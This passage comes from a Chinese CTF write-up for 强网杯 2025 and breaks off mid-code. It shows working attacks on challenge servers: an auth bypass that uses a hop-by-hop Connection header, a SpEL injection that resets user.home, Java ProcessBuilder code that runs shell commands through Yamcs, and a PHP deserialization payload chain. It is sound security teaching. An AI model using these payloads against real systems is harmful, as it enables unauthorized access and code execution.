class="hljs-built_in">id</span>=uid_int).first()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>            flash(<span class="hljs-string">&#x27;User not found. Please sign in again.&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>        g.current_user = user<br>        <span class="hljs-keyword">return</span> view_func(*args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapped<br><br></code></pre></td></tr></table></figure><p>不难注意到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">uid = request.headers.get(<span class="hljs-string">&#x27;X-User&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br></code></pre></td></tr></table></figure><p>uid的从X-User头获取，如果没获取到就设置为0而0就代表admin，那么漏洞点很明显了，接下来只需要找到一个办法，让后端获取不到X-User,显然需要从代理入手,代理设置X-User的方式如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go">authorizer := &amp;httputil.ReverseProxy&#123;Director: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request)</span></span> &#123;<br>req.URL.Scheme = <span class="hljs-string">&quot;http&quot;</span><br>req.URL.Host = <span class="hljs-string">&quot;127.0.0.1:5000&quot;</span><br><br>uid := GetUIDFromRequest(req)<br>log.Printf(<span class="hljs-string">&quot;Request UID: %s, URL: %s&quot;</span>, uid, req.URL.String())<br>req.Header.Del(<span class="hljs-string">&quot;Authorization&quot;</span>)<br>req.Header.Del(<span class="hljs-string">&quot;X-User&quot;</span>)<br>req.Header.Del(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br>req.Header.Del(<span class="hljs-string">&quot;Cookie&quot;</span>)<br><br><span class="hljs-keyword">if</span> uid == <span class="hljs-string">&quot;&quot;</span> &#123;<br>req.Header.Set(<span class="hljs-string">&quot;X-User&quot;</span>, <span class="hljs-string">&quot;anonymous&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>req.Header.Set(<span class="hljs-string">&quot;X-User&quot;</span>, uid)<br>&#125;<br>&#125;&#125;<br></code></pre></td></tr></table></figure><p>没有什么明显的问题，这里可以拷打一下ai，找一下有没有什么办法让代理不转发请求头到后端</p><p>搜到了一篇2019年的文章</p><p><a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers?utm_source=chatgpt.com">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers?utm_source=chatgpt.com</a></p><p>简单来说，就是当你在Connection里面填加了一个请求头的名字，代理就不会把这个请求头转发到后端</p><p>如果我们Connection:X-User,那么代理就不会把X-User转发到后端，这样uid就会被设置为0</p><p><img src="/2025/10/21/强网杯2025wp/image-20251021202520978-17610495279431.png" alt="image-20251021202520978"></p><h1 id="bbjv"><a href="/2025/10/21/强网杯2025wp/#bbjv" class="headerlink" title="bbjv"></a>bbjv</h1><p>用jadx反编译jar包</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019163923028.png" alt="image-20251019163923028"></p><p>获取flag的逻辑很简单，System.getProperty(“user.home”)获取用户的主目录，返回主目录下的flag.txt文件</p><p>而flag在</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019164059019.png" alt="image-20251019164059019"></p><p>两种思路，rce，把flag.txt移动到用户的主目录下，或者更改用户的主目录到tmp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.evaluationService.evaluate(rule);<br></code></pre></td></tr></table></figure><p>调用evaluate执行用户传入的rule</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">evaluate</span><span class="hljs-params">(String expression)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.parser.parseExpression(expression, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>()).getValue(<span class="hljs-built_in">this</span>.context);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Result: &quot;</span> + String.valueOf(result);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>明显存在spel表达式注入</p><p>先尝试rce</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">#&#123;<span class="hljs-built_in">T</span>(java.lang.String)&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/21/强网杯2025wp/image-20251019165602847.png" alt="image-20251019165602847"></p><p>测试了一下发现无论用啥都会返回找不到包，再阅读源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-comment">/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/config/SpelConfig.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpelConfig</span> &#123;<br>    <span class="hljs-meta">@Bean(&#123;&quot;systemProperties&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">systemProperties</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> System.getProperties();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean(&#123;&quot;restrictedEvalContext&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> EvaluationContext <span class="hljs-title function_">restrictedEvaluationContext</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;systemProperties&quot;)</span> Properties systemProperties)</span> &#123;<br>        <span class="hljs-type">SimpleEvaluationContext</span> <span class="hljs-variable">simpleContext</span> <span class="hljs-operator">=</span> SimpleEvaluationContext.forPropertyAccessors(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurePropertyAccessor</span>()).build();<br>        simpleContext.setVariable(<span class="hljs-string">&quot;systemProperties&quot;</span>, systemProperties);<br>        <span class="hljs-keyword">return</span> simpleContext;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现定义了一个名为<code>systemProperties</code>的 Bean，返回当前 JVM 的系统属性</p><p>定义了一个名为<code>restrictedEvalContext</code>的 Bean</p><p>创建<code>SimpleEvaluationContext</code>：这是一个受限的 SpEL 上下文（相比<code>StandardEvaluationContext</code>更安全），仅支持基本的表达式功能，限制了对复杂对象的访问，所以没办法rce了</p><p>而将<code>systemProperties</code>对象作为变量<code>systemProperties</code>放入上下文，使得 SpEL 表达式中可以通过<code>#systemProperties</code>引用系统属性</p><p>所以先看一下user.home</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019170116771.png" alt="image-20251019170116771"></p><p>更改user.home的值为&#x2F;tmp</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019170231800.png" alt="image-20251019170231800"></p><p>拿到flag</p><h1 id="yamcs"><a href="/2025/10/21/强网杯2025wp/#yamcs" class="headerlink" title="yamcs"></a>yamcs</h1><p>附件只有一个docker，感觉像找cve，搜一下yamcs</p><p>Yamcs 是一个开源软件框架 用于航天器的指挥和控制， 卫星、有效载荷、地面站 和地面设备。</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019170653918.png" alt="image-20251019170653918"></p><p>手册里提到了非常多的web接口</p><p>简单看了一下环境中的功能点，Algorithms接口可以编写java代码，他会执行代码并输出到out0</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019170756581.png" alt="image-20251019170756581"></p><p>尝试通过执行命令来获取flag</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019171020573.png" alt="image-20251019171020573"></p><p>报错了，原因是没有对应的包，只能使用 Java 内置的 ProcessBuilder 了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 执行命令：cat /flag</span><br>    java.lang.<span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    pb.redirectErrorStream(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 合并标准错误到标准输出，避免进程阻塞</span><br>    java.lang.<span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> pb.start();<br><br>    <span class="hljs-comment">// 读取命令输出</span><br>    java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(p.getInputStream(), java.nio.charset.StandardCharsets.UTF_8)<br>    );<br>    java.lang.<span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuilder();<br>    String line;<br>    <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>        sb.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 等待命令执行完成，获取退出码</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">exitCode</span> <span class="hljs-operator">=</span> p.waitFor();<br>    sb.append(<span class="hljs-string">&quot;EXIT_CODE=&quot;</span>).append(exitCode);<br><br>    <span class="hljs-comment">// 输出结果</span><br>    out0.setStringValue(sb.toString());<br><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(<span class="hljs-string">&quot;IOException: &quot;</span> + e.getMessage());<br>&#125; <span class="hljs-keyword">catch</span> (java.lang.InterruptedException e) &#123;<br>    System.out.println(<span class="hljs-string">&quot;Interrupted: &quot;</span> + e.getMessage());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/21/强网杯2025wp/image-20251019171335581.png" alt="image-20251019171335581"></p><p>没报错了，看下输出结果</p><p><img src="/2025/10/21/强网杯2025wp/image-20251019171354952.png" alt="image-20251019171354952"></p><p>拿到flag</p><h1 id="ezphp-赛后"><a href="/2025/10/21/强网杯2025wp/#ezphp-赛后" class="headerlink" title="ezphp(赛后)"></a>ezphp(赛后)</h1><p>这题比赛的时候被绕晕了，没做出来，赛后参考几个大佬的解法尝试复现了一下，总的来看这题就三步</p><p>第一步：上传一个文件，调用readflag进行文件包含</p><p>第二步：绕过文件上传的内容检测</p><p>第三步：suid提权</p><p>将源码精简一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$readflag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;readflag = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;called upload\n&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-title function_ invoke__">phpinfo</span>();<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;define readflag\n&quot;</span>);<br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>                    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;called readflag\n&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;called __destruct\n&quot;</span>);<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;f;<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;readflag;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-variable">$func</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;func&#x27;</span>) &#123;<br>            <span class="hljs-variable">$func</span>();<span class="hljs-comment">//readflag();</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;else\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>test类的构造函数中new了一个匿名类，匿名类的构造方法是一个文件上传，匿名类还有一个readflag方法，他定义了一个readflag函数，readflag函数会对上传的文件进行内容检测，然后include包含。</p><p>先来分析第一步，文件上传+触发readflag</p><p>想触发文件上传很简单，只要触发test类的构造方法就可以了，而触发readflag函数需要先调用匿名类的readflag方法，然后再调用readflag函数</p><p>我们只有两个地方能触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;class&#x27;</span>) &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-variable">$func</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key == <span class="hljs-string">&#x27;func&#x27;</span>) &#123;<br>    <span class="hljs-variable">$func</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我们想通过$func();的方式来调用类里的函数，需要用到php的数组</p><p>也就是，如果存在一个类A，类A有一个readflag方法，我们可以通过如下方式调用这个readflag方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$func</span> = [<span class="hljs-variable">$o</span>,<span class="hljs-string">&quot;readflag&quot;</span>];<br><span class="hljs-variable">$func</span>();<br></code></pre></td></tr></table></figure><p>因为这题的匿名类是绑定到test类对象的readflag属性上的，我们就可以利用这个特性同时序列化多个对象来实现文件上传和包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;f = [&amp;<span class="hljs-variable">$o1</span>-&gt;readflag,<span class="hljs-string">&#x27;readflag&#x27;</span>];<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt; key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt; f = [&amp;<span class="hljs-variable">$o1</span>,<span class="hljs-string">&#x27;__construct&#x27;</span>];<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$o3</span>,<span class="hljs-variable">$o2</span>,<span class="hljs-variable">$o1</span>]);<br>     <span class="hljs-comment">//反序列化的时候，o3调用o1的构造方法，new一个匿名类，触发文件上传，o2调用匿名类的readflag方法定义了全局的readflag函数，o1调用全局的readflag函数，进行文件包含</span><br></code></pre></td></tr></table></figure><p>但是这样你运行一下会发现有问题</p><p><img src="/2025/10/21/强网杯2025wp/image-20251022102436027.png" alt="image-20251022102436027"></p><p>匿名类是不能被序列化的</p><p>解决方法也很简单，可以在序列化的时候先把test类的方法删掉，因为方法不会被序列化，或者可以先把每个对象的readflag属性赋值为0，反正我们反序列化的时候会调用$o1的构造方法，readflag会被重新赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;f = [&amp;<span class="hljs-variable">$o1</span>-&gt;readflag,<span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt; key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt; f = [&amp;<span class="hljs-variable">$o1</span>,<span class="hljs-string">&#x27;__construct&#x27;</span>];<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$o3</span>,<span class="hljs-variable">$o2</span>,<span class="hljs-variable">$o1</span>]);<br></code></pre></td></tr></table></figure><p>以上是第一种方法，下面介绍看到的另一种的思路</p><p>既然可以利用[类名，方法名]的方式调用类的方法，那么匿名类有没有类名呢，如果有的话是不是就可以直接调用而不依赖readflag属性了</p><p>php的get_declared_classes()函数可以获取到当前的所有类对象</p><p>打印一下就可以看到</p><pre><code class="hljs">[140] =&gt; mysqli_stmt[141] =&gt; PharException[142] =&gt; Phar[143] =&gt; PharData[144] =&gt; PharFileInfo[145] =&gt; class@anonymousE:\qwb2025\ez_php\test.php:9$0[146] =&gt; test</code></pre><p>class@anonymousE:\qwb2025\ez_php\test.php:9$0就是匿名类的类名，分析一下他的组成</p><p>class@anonymous是固定的，这里有一个小坑，如果你编码一下再输出就会发现它的格式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">class</span>%<span class="hljs-number">40</span>anonymous%<span class="hljs-number">00</span>E%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>Cqwb2025%<span class="hljs-number">5</span>Cez_php%<span class="hljs-number">5</span>Ctest.php%<span class="hljs-number">3</span>A9%<span class="hljs-number">240</span><br></code></pre></td></tr></table></figure><p>class@anonymous和路径之间有一个%00</p><p>最后的9是创建对象的代码的行号，$0是一个计数器</p><p><strong>注意</strong>：经测试，如果是php7.3后面不是行号加上这个计数器，而是一串16进制数字</p><p>那么我们尝试一下利用这个类名来调用方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;class&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;f = [<span class="hljs-string">&quot;class@anonymous\0E:\qwb2025\\ez_php\\test.php:9<span class="hljs-subst">$0</span>&quot;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$obj1</span>, <span class="hljs-variable">$obj2</span>, <span class="hljs-variable">$obj3</span>]));<br></code></pre></td></tr></table></figure><p>这样也是可以的,但是注意要换成题目环境的匿名函数名，因为它的代码都在第一行，所以很容易得到（可以自己起个环境加个输出）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$o1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o1</span>-&gt;f = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;key = <span class="hljs-string">&#x27;class&#x27;</span>;<br><span class="hljs-variable">$o1</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o2</span>-&gt;f = [<span class="hljs-string">&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="hljs-subst">$0</span>&quot;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span>];<br><span class="hljs-variable">$o2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o2</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-variable">$o3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$o3</span>-&gt;f = <span class="hljs-string">&#x27;readflag&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$o3</span>-&gt;readflag = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>([<span class="hljs-variable">$obj1</span>, <span class="hljs-variable">$obj2</span>, <span class="hljs-variable">$obj3</span>]));<br></code></pre></td></tr></table></figure><p>第一步就解决了，下面分析如果绕过内容检测，也有两种思路</p><p><strong>思路一</strong>：</p><p>文件上传的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span 